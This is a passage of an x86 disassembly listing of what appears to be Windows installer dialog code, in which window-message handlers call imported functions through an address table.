  404a8f:	68 01 20 00 00       	push   $0x2001
  404a94:	53                   	push   %ebx
  404a95:	ff d7                	call   *%edi
  404a97:	e9 f8 01 00 00       	jmp    0x404c94
  404a9c:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  404aa2:	75 44                	jne    0x404ae8
  404aa4:	8d 44 24 64          	lea    0x64(%esp),%eax
  404aa8:	33 f6                	xor    %esi,%esi
  404aaa:	50                   	push   %eax
  404aab:	56                   	push   %esi
  404aac:	68 ec 03 00 00       	push   $0x3ec
  404ab1:	ff 74 24 6c          	push   0x6c(%esp)
  404ab5:	ff 15 2c 82 40 00    	call   *0x40822c
  404abb:	50                   	push   %eax
  404abc:	68 a7 55 40 00       	push   $0x4055a7
  404ac1:	56                   	push   %esi
  404ac2:	56                   	push   %esi
  404ac3:	ff 15 94 80 40 00    	call   *0x408094
  404ac9:	50                   	push   %eax
  404aca:	ff 15 08 81 40 00    	call   *0x408108
  404ad0:	ff 74 24 6c          	push   0x6c(%esp)
  404ad4:	ff 74 24 6c          	push   0x6c(%esp)
  404ad8:	57                   	push   %edi
  404ad9:	e8 c0 09 00 00       	call   0x40549e
  404ade:	5f                   	pop    %edi
  404adf:	5e                   	pop    %esi
  404ae0:	5d                   	pop    %ebp
  404ae1:	5b                   	pop    %ebx
  404ae2:	83 c4 4c             	add    $0x4c,%esp
  404ae5:	c2 10 00             	ret    $0x10
  404ae8:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  404aee:	75 29                	jne    0x404b19
  404af0:	b8 03 04 00 00       	mov    $0x403,%eax
  404af5:	66 39 44 24 68       	cmp    %ax,0x68(%esp)
  404afa:	75 d4                	jne    0x404ad0
  404afc:	8b 35 30 82 40 00    	mov    0x408230,%esi
  404b02:	6a 00                	push   $0x0
  404b04:	ff 35 e4 37 42 00    	push   0x4237e4
  404b0a:	ff d6                	call   *%esi
  404b0c:	6a 08                	push   $0x8
  404b0e:	53                   	push   %ebx
  404b0f:	ff d6                	call   *%esi
  404b11:	53                   	push   %ebx
  404b12:	e8 99 07 00 00       	call   0x4052b0
  404b17:	eb b7                	jmp    0x404ad0
  404b19:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  404b1f:	75 46                	jne    0x404b67
  404b21:	83 3d ec 37 42 00 00 	cmpl   $0x0,0x4237ec
  404b28:	74 13                	je     0x404b3d
  404b2a:	c7 05 cc f5 41 00 02 	movl   $0x2,0x41f5cc
  404b31:	00 00 00 
  404b34:	6a 78                	push   $0x78
  404b36:	e8 60 0b 00 00       	call   0x40569b
  404b3b:	eb 93                	jmp    0x404ad0
  404b3d:	6a 08                	push   $0x8
  404b3f:	ff 35 f8 37 42 00    	push   0x4237f8
  404b45:	ff 15 30 82 40 00    	call   *0x408230
  404b4b:	83 3d cc 40 42 00 00 	cmpl   $0x0,0x4240cc
  404b52:	75 0f                	jne    0x404b63
  404b54:	a1 d4 05 42 00       	mov    0x4205d4,%eax
  404b59:	6a 00                	push   $0x0
  404b5b:	ff 70 34             	push   0x34(%eax)
  404b5e:	e8 ff 0e 00 00       	call   0x405a62
  404b63:	6a 01                	push   $0x1
  404b65:	eb cf                	jmp    0x404b36
  404b67:	83 ff 7b             	cmp    $0x7b,%edi
  404b6a:	0f 85 60 ff ff ff    	jne    0x404ad0
  404b70:	39 5c 24 68          	cmp    %ebx,0x68(%esp)
  404b74:	0f 85 56 ff ff ff    	jne    0x404ad0
  404b7a:	33 f6                	xor    %esi,%esi
  404b7c:	56                   	push   %esi
  404b7d:	56                   	push   %esi
  404b7e:	68 04 10 00 00       	push   $0x1004
  404b83:	53                   	push   %ebx
  404b84:	ff 15 40 82 40 00    	call   *0x408240
  404b8a:	8b e8                	mov    %eax,%ebp
  404b8c:	89 6c 24 68          	mov    %ebp,0x68(%esp)
  404b90:	85 ed                	test   %ebp,%ebp
  404b92:	0f 8e fc 00 00 00    	jle    0x404c94
  404b98:	ff 15 ac 81 40 00    	call   *0x4081ac
  404b9e:	6a e1                	push   $0xffffffe1
  404ba0:	56                   	push   %esi
  404ba1:	8b f8                	mov    %eax,%edi
  404ba3:	e8 5d 10 00 00       	call   0x405c05
  404ba8:	50                   	push   %eax
  404ba9:	6a 01                	push   $0x1
  404bab:	56                   	push   %esi
  404bac:	57                   	push   %edi
  404bad:	ff 15 a4 81 40 00    	call   *0x4081a4
  404bb3:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  404bb7:	8b c1                	mov    %ecx,%eax
  404bb9:	c1 e8 10             	shr    $0x10,%eax
  404bbc:	0f bf d1             	movswl %cx,%edx
  404bbf:	98                   	cwtl
  404bc0:	83 f9 ff             	cmp    $0xffffffff,%ecx
  404bc3:	75 14                	jne    0x404bd9
  404bc5:	8d 44 24 10          	lea    0x10(%esp),%eax
  404bc9:	50                   	push   %eax
  404bca:	53                   	push   %ebx
  404bcb:	ff 15 9c 81 40 00    	call   *0x40819c
  404bd1:	8b 54 24 10          	mov    0x10(%esp),%edx
  404bd5:	8b 44 24 14          	mov    0x14(%esp),%eax
  404bd9:	56                   	push   %esi
  404bda:	ff 74 24 64          	push   0x64(%esp)
  404bde:	56                   	push   %esi
  404bdf:	50                   	push   %eax
  404be0:	52                   	push   %edx
  404be1:	68 80 01 00 00       	push   $0x180
  404be6:	57                   	push   %edi
  404be7:	ff 15 a0 81 40 00    	call   *0x4081a0
  404bed:	33 c9                	xor    %ecx,%ecx
  404bef:	41                   	inc    %ecx
  404bf0:	3b c1                	cmp    %ecx,%eax
  404bf2:	0f 85 9c 00 00 00    	jne    0x404c94
  404bf8:	8b fd                	mov    %ebp,%edi
  404bfa:	89 74 24 28          	mov    %esi,0x28(%esp)
  404bfe:	c7 44 24 34 d0 f5 41 	movl   $0x41f5d0,0x34(%esp)
  404c05:	00 
  404c06:	8b e9                	mov    %ecx,%ebp
  404c08:	c7 44 24 38 00 10 00 	movl   $0x1000,0x38(%esp)
  404c0f:	00 
  404c10:	8d 44 24 20          	lea    0x20(%esp),%eax
  404c14:	4f                   	dec    %edi
  404c15:	50                   	push   %eax
  404c16:	57                   	push   %edi
  404c17:	68 2d 10 00 00       	push   $0x102d
  404c1c:	53                   	push   %ebx
  404c1d:	ff 15 40 82 40 00    	call   *0x408240
  404c23:	83 c5 02             	add    $0x2,%ebp
  404c26:	03 e8                	add    %eax,%ebp
  404c28:	85 ff                	test   %edi,%edi
  404c2a:	75 e4                	jne    0x404c10
  404c2c:	56                   	push   %esi
  404c2d:	ff 15 c8 81 40 00    	call   *0x4081c8
  404c33:	ff 15 bc 81 40 00    	call   *0x4081bc
  404c39:	55                   	push   %ebp
  404c3a:	6a 42                	push   $0x42
  404c3c:	ff 15 f4 80 40 00    	call   *0x4080f4
  404c42:	8b e8                	mov    %eax,%ebp
  404c44:	55                   	push   %ebp
  404c45:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  404c49:	ff 15 8c 80 40 00    	call   *0x40808c
  404c4f:	8b 6c 24 68          	mov    0x68(%esp),%ebp
  404c53:	8b f8                	mov    %eax,%edi
  404c55:	8d 44 24 20          	lea    0x20(%esp),%eax
  404c59:	89 7c 24 34          	mov    %edi,0x34(%esp)
  404c5d:	50                   	push   %eax
  404c5e:	56                   	push   %esi
  404c5f:	68 2d 10 00 00       	push   $0x102d
  404c64:	53                   	push   %ebx
  404c65:	ff 15 40 82 40 00    	call   *0x408240
  404c6b:	03 f8                	add    %eax,%edi
  404c6d:	66 c7 07 0d 0a       	movw   $0xa0d,(%edi)
  404c72:	83 c7 02             	add    $0x2,%edi
  404c75:	46                   	inc    %esi
  404c76:	3b f5                	cmp    %ebp,%esi
  404c78:	7c db                	jl     0x404c55
  404c7a:	8b 6c 24 60          	mov    0x60(%esp),%ebp
  404c7e:	55                   	push   %ebp
  404c7f:	ff 15 90 80 40 00    	call   *0x408090
  404c85:	55                   	push   %ebp
  404c86:	6a 01                	push   $0x1
  404c88:	ff 15 c0 81 40 00    	call   *0x4081c0
  404c8e:	ff 15 c4 81 40 00    	call   *0x4081c4
  404c94:	33 c0                	xor    %eax,%eax
  404c96:	e9 43 fe ff ff       	jmp    0x404ade
  404c9b:	55                   	push   %ebp
  404c9c:	8b ec                	mov    %esp,%ebp
  404c9e:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ca5:	56                   	push   %esi
  404ca6:	8b 75 14             	mov    0x14(%ebp),%esi
  404ca9:	75 26                	jne    0x404cd1
  404cab:	ff 76 30             	push   0x30(%esi)
  404cae:	6a 1d                	push   $0x1d
  404cb0:	ff 75 08             	push   0x8(%ebp)
  404cb3:	e8 0f 06 00 00       	call   0x4052c7
  404cb8:	8b 46 3c             	mov    0x3c(%esi),%eax
  404cbb:	c1 e0 0a             	shl    $0xa,%eax
  404cbe:	05 00 50 42 00       	add    $0x425000,%eax
  404cc3:	50                   	push   %eax
  404cc4:	68 e8 03 00 00       	push   $0x3e8
  404cc9:	ff 75 08             	push   0x8(%ebp)
  404ccc:	e8 eb 1a 00 00       	call   0x4067bc
  404cd1:	56                   	push   %esi
  404cd2:	ff 75 10             	push   0x10(%ebp)
  404cd5:	ff 75 0c             	push   0xc(%ebp)
  404cd8:	e8 c1 07 00 00       	call   0x40549e
  404cdd:	5e                   	pop    %esi
  404cde:	5d                   	pop    %ebp
  404cdf:	c2 10 00             	ret    $0x10
  404ce2:	55                   	push   %ebp
  404ce3:	8b ec                	mov    %esp,%ebp
  404ce5:	56                   	push   %esi
  404ce6:	33 f6                	xor    %esi,%esi
  404ce8:	46                   	inc    %esi
  404ce9:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404cec:	75 18                	jne    0x404d06
  404cee:	ff 75 14             	push   0x14(%ebp)
  404cf1:	68 fb 03 00 00       	push   $0x3fb
  404cf6:	e8 f8 19 00 00       	call   0x4066f3
  404cfb:	ff 75 14             	push   0x14(%ebp)
  404cfe:	56                   	push   %esi
  404cff:	68 66 04 00 00       	push   $0x466
  404d04:	eb 2b                	jmp    0x404d31
  404d06:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404d0a:	75 2e                	jne    0x404d3a
  404d0c:	ff 75 14             	push   0x14(%ebp)
  404d0f:	ff 75 10             	push   0x10(%ebp)
  404d12:	ff 15 70 81 40 00    	call   *0x408170
  404d18:	85 c0                	test   %eax,%eax
  404d1a:	74 0b                	je     0x404d27
  404d1c:	6a 07                	push   $0x7
  404d1e:	e8 10 c8 ff ff       	call   0x401533
  404d23:	85 c0                	test   %eax,%eax
  404d25:	74 02                	je     0x404d29
  404d27:	33 f6                	xor    %esi,%esi
  404d29:	56                   	push   %esi
  404d2a:	6a 00                	push   $0x0
  404d2c:	68 65 04 00 00       	push   $0x465
  404d31:	ff 75 08             	push   0x8(%ebp)
  404d34:	ff 15 40 82 40 00    	call   *0x408240
  404d3a:	33 c0                	xor    %eax,%eax
  404d3c:	5e                   	pop    %esi
  404d3d:	5d                   	pop    %ebp
  404d3e:	c2 10 00             	ret    $0x10
  404d41:	83 ec 10             	sub    $0x10,%esp
  404d44:	b8 10 01 00 00       	mov    $0x110,%eax
  404d49:	53                   	push   %ebx
  404d4a:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  404d4e:	55                   	push   %ebp
  404d4f:	56                   	push   %esi
  404d50:	33 ed                	xor    %ebp,%ebp
  404d52:	57                   	push   %edi
  404d53:	8b 7c 24 28          	mov    0x28(%esp),%edi
  404d57:	45                   	inc    %ebp
  404d58:	3b f8                	cmp    %eax,%edi
  404d5a:	0f 84 82 01 00 00    	je     0x404ee2
  404d60:	81 ff 08 04 00 00    	cmp    $0x408,%edi
  404d66:	0f 84 76 01 00 00    	je     0x404ee2
  404d6c:	83 ff 47             	cmp    $0x47,%edi
  404d6f:	75 1a                	jne    0x404d8b
  404d71:	6a 13                	push   $0x13
  404d73:	33 f6                	xor    %esi,%esi
  404d75:	56                   	push   %esi
  404d76:	56                   	push   %esi
  404d77:	56                   	push   %esi
  404d78:	56                   	push   %esi
  404d79:	53                   	push   %ebx
  404d7a:	ff 35 d8 05 42 00    	push   0x4205d8
  404d80:	ff 15 dc 81 40 00    	call   *0x4081dc
  404d86:	e9 43 01 00 00       	jmp    0x404ece
  404d8b:	83 ff 05             	cmp    $0x5,%edi
  404d8e:	75 4e                	jne    0x404dde
  404d90:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404d94:	8b 35 30 82 40 00    	mov    0x408230,%esi
  404d9a:	8d 43 ff             	lea    -0x1(%ebx),%eax
  404d9d:	f7 d8                	neg    %eax
  404d9f:	1b c0                	sbb    %eax,%eax
  404da1:	23 c7                	and    %edi,%eax
  404da3:	50                   	push   %eax
  404da4:	ff 35 d8 05 42 00    	push   0x4205d8
  404daa:	ff d6                	call   *%esi
  404dac:	83 fb 02             	cmp    $0x2,%ebx
  404daf:	0f 85 1d 01 00 00    	jne    0x404ed2
  404db5:	6a f0                	push   $0xfffffff0
  404db7:	ff 74 24 28          	push   0x28(%esp)
  404dbb:	ff 15 74 82 40 00    	call   *0x408274
  404dc1:	25 00 00 01 21       	and    $0x21010000,%eax
  404dc6:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404dcb:	0f 85 01 01 00 00    	jne    0x404ed2
  404dd1:	6a 04                	push   $0x4
  404dd3:	ff 74 24 28          	push   0x28(%esp)
  404dd7:	ff d6                	call   *%esi
  404dd9:	e9 f4 00 00 00       	jmp    0x404ed2
  404dde:	81 ff 0d 04 00 00    	cmp    $0x40d,%edi
  404de4:	75 1a                	jne    0x404e00
  404de6:	ff 35 dc 37 42 00    	push   0x4237dc
  404dec:	ff 15 08 82 40 00    	call   *0x408208
  404df2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404df6:	a3 dc 37 42 00       	mov    %eax,0x4237dc
  404dfb:	e9 3b 04 00 00       	jmp    0x40523b
  404e00:	83 ff 11             	cmp    $0x11,%edi
  404e03:	75 13                	jne    0x404e18
  404e05:	33 f6                	xor    %esi,%esi
  404e07:	56                   	push   %esi
  404e08:	56                   	push   %esi
  404e09:	53                   	push   %ebx
  404e0a:	ff 15 14 82 40 00    	call   *0x408214
  404e10:	33 c0                	xor    %eax,%eax
  404e12:	40                   	inc    %eax
  404e13:	e9 41 04 00 00       	jmp    0x405259
  404e18:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  404e1e:	0f 85 aa 00 00 00    	jne    0x404ece
  404e24:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404e28:	0f b7 f3             	movzwl %bx,%esi
  404e2b:	56                   	push   %esi
  404e2c:	ff 74 24 28          	push   0x28(%esp)
  404e30:	89 74 24 30          	mov    %esi,0x30(%esp)
  404e34:	ff 15 2c 82 40 00    	call   *0x40822c
  404e3a:	8b e8                	mov    %eax,%ebp
  404e3c:	85 ed                	test   %ebp,%ebp
  404e3e:	74 23                	je     0x404e63
  404e40:	33 f6                	xor    %esi,%esi
  404e42:	56                   	push   %esi
  404e43:	56                   	push   %esi
  404e44:	68 f3 00 00 00       	push   $0xf3
  404e49:	55                   	push   %ebp
  404e4a:	ff 15 40 82 40 00    	call   *0x408240
  404e50:	55                   	push   %ebp
  404e51:	ff 15 b8 81 40 00    	call   *0x4081b8
  404e57:	85 c0                	test   %eax,%eax
  404e59:	0f 84 f8 03 00 00    	je     0x405257
  404e5f:	8b 74 24 28          	mov    0x28(%esp),%esi
  404e63:	33 ed                	xor    %ebp,%ebp
  404e65:	45                   	inc    %ebp
  404e66:	3b f5                	cmp    %ebp,%esi
  404e68:	75 03                	jne    0x404e6d
  404e6a:	55                   	push   %ebp
  404e6b:	eb 41                	jmp    0x404eae
  404e6d:	83 fe 03             	cmp    $0x3,%esi
  404e70:	75 0d                	jne    0x404e7f
  404e72:	83 3d 14 a0 40 00 00 	cmpl   $0x0,0x40a014
  404e79:	7e 3a                	jle    0x404eb5
  404e7b:	6a ff                	push   $0xffffffff
  404e7d:	eb 2f                	jmp    0x404eae
  404e7f:	83 fe 02             	cmp    $0x2,%esi
  404e82:	75 31                	jne    0x404eb5
  404e84:	83 3d cc 40 42 00 00 	cmpl   $0x0,0x4240cc
  404e8b:	74 0e                	je     0x404e9b
  404e8d:	56                   	push   %esi
  404e8e:	e8 a0 c6 ff ff       	call   0x401533
  404e93:	89 35 cc f5 41 00    	mov    %esi,0x41f5cc
  404e99:	eb 11                	jmp    0x404eac
  404e9b:	6a 03                	push   $0x3
  404e9d:	e8 91 c6 ff ff       	call   0x401533
  404ea2:	85 c0                	test   %eax,%eax
  404ea4:	75 2c                	jne    0x404ed2
  404ea6:	89 2d cc f5 41 00    	mov    %ebp,0x41f5cc
  404eac:	6a 78                	push   $0x78
  404eae:	e8 e8 07 00 00       	call   0x40569b
  404eb3:	eb 1d                	jmp    0x404ed2
  404eb5:	ff 74 24 30          	push   0x30(%esp)
  404eb9:	ff 74 24 30          	push   0x30(%esp)
  404ebd:	68 11 01 00 00       	push   $0x111
  404ec2:	ff 35 dc 37 42 00    	push   0x4237dc
  404ec8:	ff 15 40 82 40 00    	call   *0x408240
  404ece:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404ed2:	ff 74 24 30          	push   0x30(%esp)
  404ed6:	53                   	push   %ebx
  404ed7:	57                   	push   %edi
  404ed8:	e8 c1 05 00 00       	call   0x40549e
  404edd:	e9 77 03 00 00       	jmp    0x405259
  404ee2:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404ee6:	8b 35 2c 82 40 00    	mov    0x40822c,%esi
  404eec:	89 0d d0 05 42 00    	mov    %ecx,0x4205d0
  404ef2:	3b f8                	cmp    %eax,%edi
  404ef4:	75 46                	jne    0x404f3c
  404ef6:	55                   	push   %ebp
  404ef7:	53                   	push   %ebx
  404ef8:	89 1d f8 37 42 00    	mov    %ebx,0x4237f8
  404efe:	ff d6                	call   *%esi
  404f00:	6a 02                	push   $0x2
  404f02:	53                   	push   %ebx
  404f03:	a3 dc 05 42 00       	mov    %eax,0x4205dc
  404f08:	ff d6                	call   *%esi
  404f0a:	6a ff                	push   $0xffffffff
  404f0c:	6a 1c                	push   $0x1c
  404f0e:	53                   	push   %ebx
  404f0f:	a3 e0 05 42 00       	mov    %eax,0x4205e0
  404f14:	e8 ae 03 00 00       	call   0x4052c7
  404f19:	ff 35 d8 37 42 00    	push   0x4237d8
  404f1f:	6a f2                	push   $0xfffffff2
  404f21:	53                   	push   %ebx
  404f22:	ff 15 8c 81 40 00    	call   *0x40818c
  404f28:	6a 04                	push   $0x4
  404f2a:	e8 04 c6 ff ff       	call   0x401533
  404f2f:	a3 ec 37 42 00       	mov    %eax,0x4237ec
  404f34:	8b cd                	mov    %ebp,%ecx
  404f36:	89 2d d0 05 42 00    	mov    %ebp,0x4205d0
  404f3c:	a1 14 a0 40 00       	mov    0x40a014,%eax
  404f41:	33 f6                	xor    %esi,%esi
  404f43:	8b f8                	mov    %eax,%edi
  404f45:	c1 e7 06             	shl    $0x6,%edi
  404f48:	03 3d 20 40 42 00    	add    0x424020,%edi
  404f4e:	85 c0                	test   %eax,%eax
  404f50:	78 3c                	js     0x404f8e
  404f52:	3b cd                	cmp    %ebp,%ecx
  404f54:	75 30                	jne    0x404f86
  404f56:	56                   	push   %esi
  404f57:	ff 77 10             	push   0x10(%edi)
  404f5a:	e8 3a c4 ff ff       	call   0x401399
  404f5f:	85 c0                	test   %eax,%eax
  404f61:	74 23                	je     0x404f86
  404f63:	55                   	push   %ebp
  404f64:	56                   	push   %esi
  404f65:	68 0f 04 00 00       	push   $0x40f
  404f6a:	ff 35 dc 37 42 00    	push   0x4237dc
  404f70:	ff 15 40 82 40 00    	call   *0x408240
  404f76:	33 c0                	xor    %eax,%eax
  404f78:	39 05 ec 37 42 00    	cmp    %eax,0x4237ec
  404f7e:	0f 94 c0             	sete   %al
  404f81:	e9 d3 02 00 00       	jmp    0x405259
  404f86:	39 37                	cmp    %esi,(%edi)
  404f88:	0f 84 c9 02 00 00    	je     0x405257
  404f8e:	68 0b 04 00 00       	push   $0x40b
  404f93:	e8 fd 02 00 00       	call   0x405295
  404f98:	8b 0d 14 a0 40 00    	mov    0x40a014,%ecx
  404f9e:	a1 d0 05 42 00       	mov    0x4205d0,%eax
  404fa3:	03 c8                	add    %eax,%ecx
  404fa5:	c1 e0 06             	shl    $0x6,%eax
  404fa8:	03 f8                	add    %eax,%edi
  404faa:	89 0d 14 a0 40 00    	mov    %ecx,0x40a014
  404fb0:	a1 24 40 42 00       	mov    0x424024,%eax
  404fb5:	3b c8                	cmp    %eax,%ecx
  404fb7:	75 11                	jne    0x404fca
  404fb9:	55                   	push   %ebp
  404fba:	e8 74 c5 ff ff       	call   0x401533
  404fbf:	a1 24 40 42 00       	mov    0x424024,%eax
  404fc4:	8b 0d 14 a0 40 00    	mov    0x40a014,%ecx
  404fca:	39 35 ec 37 42 00    	cmp    %esi,0x4237ec
  404fd0:	0f 85 41 02 00 00    	jne    0x405217
  404fd6:	3b c8                	cmp    %eax,%ecx
  404fd8:	0f 83 39 02 00 00    	jae    0x405217
  404fde:	ff 77 24             	push   0x24(%edi)
  404fe1:	8b 47 14             	mov    0x14(%edi),%eax
  404fe4:	68 00 c8 42 00       	push   $0x42c800
  404fe9:	89 44 24 34          	mov    %eax,0x34(%esp)
  404fed:	e8 13 0c 00 00       	call   0x405c05
  404ff2:	ff 77 20             	push   0x20(%edi)
  404ff5:	68 19 fc ff ff       	push   $0xfffffc19
  404ffa:	53                   	push   %ebx
  404ffb:	e8 c7 02 00 00       	call   0x4052c7
  405000:	ff 77 1c             	push   0x1c(%edi)
  405003:	68 1b fc ff ff       	push   $0xfffffc1b
  405008:	53                   	push   %ebx
  405009:	e8 b9 02 00 00       	call   0x4052c7
  40500e:	ff 77 28             	push   0x28(%edi)
  405011:	68 1a fc ff ff       	push   $0xfffffc1a
  405016:	53                   	push   %ebx
  405017:	e8 ab 02 00 00       	call   0x4052c7
  40501c:	6a 03                	push   $0x3
  40501e:	53                   	push   %ebx
  40501f:	ff 15 2c 82 40 00    	call   *0x40822c
  405025:	8b c8                	mov    %eax,%ecx
  405027:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40502b:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  40502f:	39 35 cc 40 42 00    	cmp    %esi,0x4240cc
  405035:	74 0c                	je     0x405043
  405037:	25 fd fe ff ff       	and    $0xfffffefd,%eax
  40503c:	83 c8 04             	or     $0x4,%eax
  40503f:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  405043:	83 e0 08             	and    $0x8,%eax
  405046:	50                   	push   %eax
  405047:	51                   	push   %ecx
  405048:	ff 15 30 82 40 00    	call   *0x408230
  40504e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405052:	25 00 01 00 00       	and    $0x100,%eax
  405057:	50                   	push   %eax
  405058:	ff 74 24 28          	push   0x28(%esp)
  40505c:	ff 15 28 82 40 00    	call   *0x408228
  405062:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405066:	83 e0 02             	and    $0x2,%eax
  405069:	50                   	push   %eax
  40506a:	ff 35 dc 05 42 00    	push   0x4205dc
  405070:	ff 15 28 82 40 00    	call   *0x408228
  405076:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40507a:	83 e0 04             	and    $0x4,%eax
  40507d:	50                   	push   %eax
  40507e:	ff 35 e0 05 42 00    	push   0x4205e0
  405084:	89 44 24 34          	mov    %eax,0x34(%esp)
  405088:	ff 15 28 82 40 00    	call   *0x408228
  40508e:	39 74 24 2c          	cmp    %esi,0x2c(%esp)
  405092:	74 03                	je     0x405097
  405094:	56                   	push   %esi
  405095:	eb 01                	jmp    0x405098
  405097:	55                   	push   %ebp
  405098:	68 60 f0 00 00       	push   $0xf060
  40509d:	56                   	push   %esi
  40509e:	53                   	push   %ebx
  40509f:	ff 15 b0 81 40 00    	call   *0x4081b0
  4050a5:	50                   	push   %eax
  4050a6:	ff 15 a8 81 40 00    	call   *0x4081a8
  4050ac:	55                   	push   %ebp
  4050ad:	56                   	push   %esi
  4050ae:	68 f4 00 00 00       	push   $0xf4
  4050b3:	ff 74 24 30          	push   0x30(%esp)
  4050b7:	ff 15 40 82 40 00    	call   *0x408240
  4050bd:	39 35 cc 40 42 00    	cmp    %esi,0x4240cc
  4050c3:	74 17                	je     0x4050dc
  4050c5:	56                   	push   %esi
  4050c6:	6a 02                	push   $0x2
  4050c8:	68 01 04 00 00       	push   $0x401
  4050cd:	53                   	push   %ebx
  4050ce:	ff 15 40 82 40 00    	call   *0x408240
  4050d4:	ff 35 e0 05 42 00    	push   0x4205e0
  4050da:	eb 06                	jmp    0x4050e2
  4050dc:	ff 35 dc 05 42 00    	push   0x4205dc
  4050e2:	e8 c9 01 00 00       	call   0x4052b0
  4050e7:	e8 57 09 00 00       	call   0x405a43
  4050ec:	50                   	push   %eax
  4050ed:	68 d0 f5 41 00       	push   $0x41f5d0
  4050f2:	e8 d1 16 00 00       	call   0x4067c8
  4050f7:	ff 77 18             	push   0x18(%edi)
  4050fa:	68 d0 f5 41 00       	push   $0x41f5d0
  4050ff:	e8 da 16 00 00       	call   0x4067de
  405104:	05 d0 f5 41 00       	add    $0x41f5d0,%eax
  405109:	50                   	push   %eax
  40510a:	e8 f6 0a 00 00       	call   0x405c05
  40510f:	68 d0 f5 41 00       	push   $0x41f5d0
  405114:	53                   	push   %ebx
  405115:	ff 15 fc 81 40 00    	call   *0x4081fc
  40511b:	56                   	push   %esi
  40511c:	ff 77 08             	push   0x8(%edi)
  40511f:	e8 75 c2 ff ff       	call   0x401399
  405124:	85 c0                	test   %eax,%eax
  405126:	0f 85 6c fe ff ff    	jne    0x404f98
  40512c:	39 37                	cmp    %esi,(%edi)
  40512e:	0f 84 64 fe ff ff    	je     0x404f98
  405134:	83 7f 04 05          	cmpl   $0x5,0x4(%edi)
  405138:	75 1d                	jne    0x405157
  40513a:	39 35 cc 40 42 00    	cmp    %esi,0x4240cc
  405140:	0f 85 11 01 00 00    	jne    0x405257
  405146:	39 35 c0 40 42 00    	cmp    %esi,0x4240c0
  40514c:	0f 85 46 fe ff ff    	jne    0x404f98
  405152:	e9 00 01 00 00       	jmp    0x405257
  405157:	ff 35 dc 37 42 00    	push   0x4237dc
  40515d:	ff 15 08 82 40 00    	call   *0x408208
  405163:	89 3d d4 05 42 00    	mov    %edi,0x4205d4
  405169:	39 37                	cmp    %esi,(%edi)
  40516b:	0f 8e c5 00 00 00    	jle    0x405236
  405171:	8b 47 04             	mov    0x4(%edi),%eax
  405174:	57                   	push   %edi
  405175:	ff 34 85 18 a0 40 00 	push   0x40a018(,%eax,4)
  40517c:	66 8b 07             	mov    (%edi),%ax
  40517f:	66 03 05 d4 37 42 00 	add    0x4237d4,%ax
  405186:	53                   	push   %ebx
  405187:	0f b7 c0             	movzwl %ax,%eax
  40518a:	50                   	push   %eax
  40518b:	ff 35 f4 37 42 00    	push   0x4237f4
  405191:	ff 15 04 82 40 00    	call   *0x408204
  405197:	a3 dc 37 42 00       	mov    %eax,0x4237dc
  40519c:	85 c0                	test   %eax,%eax
  40519e:	0f 84 97 00 00 00    	je     0x40523b
  4051a4:	ff 77 2c             	push   0x2c(%edi)
  4051a7:	6a 06                	push   $0x6
  4051a9:	50                   	push   %eax
  4051aa:	e8 18 01 00 00       	call   0x4052c7
  4051af:	8d 44 24 10          	lea    0x10(%esp),%eax
  4051b3:	50                   	push   %eax
  4051b4:	68 fa 03 00 00       	push   $0x3fa
  4051b9:	53                   	push   %ebx
  4051ba:	ff 15 2c 82 40 00    	call   *0x40822c
  4051c0:	50                   	push   %eax
  4051c1:	ff 15 9c 81 40 00    	call   *0x40819c
  4051c7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4051cb:	50                   	push   %eax
  4051cc:	53                   	push   %ebx
  4051cd:	ff 15 94 81 40 00    	call   *0x408194
  4051d3:	6a 15                	push   $0x15
  4051d5:	56                   	push   %esi
  4051d6:	56                   	push   %esi
  4051d7:	ff 74 24 20          	push   0x20(%esp)
  4051db:	ff 74 24 20          	push   0x20(%esp)
  4051df:	56                   	push   %esi
  4051e0:	ff 35 dc 37 42 00    	push   0x4237dc
  4051e6:	ff 15 dc 81 40 00    	call   *0x4081dc
  4051ec:	56                   	push   %esi
  4051ed:	ff 77 0c             	push   0xc(%edi)
  4051f0:	e8 a4 c1 ff ff       	call   0x401399
  4051f5:	39 35 ec 37 42 00    	cmp    %esi,0x4237ec
  4051fb:	75 5a                	jne    0x405257
  4051fd:	6a 08                	push   $0x8
  4051ff:	ff 35 dc 37 42 00    	push   0x4237dc
  405205:	ff 15 30 82 40 00    	call   *0x408230
  40520b:	68 05 04 00 00       	push   $0x405
  405210:	e8 80 00 00 00       	call   0x405295
  405215:	eb 1f                	jmp    0x405236
  405217:	ff 35 dc 37 42 00    	push   0x4237dc
  40521d:	ff 15 08 82 40 00    	call   *0x408208
  405223:	ff 35 cc f5 41 00    	push   0x41f5cc
  405229:	89 35 f8 37 42 00    	mov    %esi,0x4237f8
  40522f:	53                   	push   %ebx
  405230:	ff 15 d0 81 40 00    	call   *0x4081d0
  405236:	a1 dc 37 42 00       	mov    0x4237dc,%eax
  40523b:	83 3d c8 f5 41 00 00 	cmpl   $0x0,0x41f5c8
  405242:	75 13                	jne    0x405257
  405244:	85 c0                	test   %eax,%eax
  405246:	74 0f                	je     0x405257
  405248:	6a 0a                	push   $0xa
  40524a:	53                   	push   %ebx
  40524b:	ff 15 30 82 40 00    	call   *0x408230
  405251:	89 2d c8 f5 41 00    	mov    %ebp,0x41f5c8
  405257:	33 c0                	xor    %eax,%eax
  405259:	5f                   	pop    %edi
  40525a:	5e                   	pop    %esi
  40525b:	5d                   	pop    %ebp
  40525c:	5b                   	pop    %ebx
